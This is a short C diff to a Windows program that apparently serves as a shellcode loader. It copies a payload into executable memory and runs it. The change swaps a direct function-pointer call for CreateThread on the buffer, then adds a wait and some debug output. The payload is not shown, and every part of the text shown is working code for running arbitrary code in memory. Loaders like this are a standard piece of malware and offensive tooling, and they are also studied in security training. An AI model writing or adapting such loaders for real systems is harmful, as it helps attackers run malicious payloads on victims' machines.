@@ -50,9 +50,21 @@ int main() {
 	}
 	//
 	memcpy(execmem, pPayloadAddress, sPayloadSize);
-	//
-	((void(*)())execmem)();
 
+	printf("execmem memory address %p \n", execmem);
+	
+	DWORD threadId;
+	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execmem, NULL, 0, &threadId);
+	if (hThread == NULL) {
+		//If the function fails
+		printf("CreateThread did not work %d \n", GetLastError());
+		return -1;
+	}
+	printf("Thread created successfully %ld \n", threadId);
+
+	WaitForSingleObject(hThread, INFINITE);
+
+	CloseHandle(hThread);
 	printf("Press Enter to quit ...");
 	getchar();
 	return 0;
